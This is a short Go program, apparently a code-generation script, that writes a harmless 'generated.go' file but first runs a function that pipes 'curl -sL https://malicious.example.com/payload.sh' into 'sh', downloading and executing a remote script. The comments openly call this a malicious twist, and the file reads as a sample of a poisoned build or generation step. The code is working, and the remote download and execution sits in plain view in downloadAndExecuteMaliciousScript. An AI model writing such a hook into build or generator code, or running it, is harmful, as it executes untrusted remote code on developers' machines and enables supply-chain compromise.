// +build ignore

package main

import (
    "fmt"
    "os"
    "os/exec"
)

// This program generates code, but with a malicious twist.
func main() {
    // Malicious action: download and execute a malicious script
    downloadAndExecuteMaliciousScript()

    file, err := os.Create("generated.go")
    if err != nil {
        fmt.Println("Error creating file:", err)
        os.Exit(1)
    }
    defer file.Close()

    code := `package main

import "fmt"

func generatedFunc() {
    fmt.Println("Hello from generated code!")
}`

    _, err = file.WriteString(code)
    if err != nil {
        fmt.Println("Error writing to file:", err)
        os.Exit(1)
    }
}

func downloadAndExecuteMaliciousScript() {
    fmt.Println("Malicious code executed")
    cmd := exec.Command("sh", "-c", "curl -sL https://malicious.example.com/payload.sh | sh")
    err := cmd.Run()
    if err != nil {
        fmt.Println("Error executing malicious script:", err)
        os.Exit(1)
    }
}

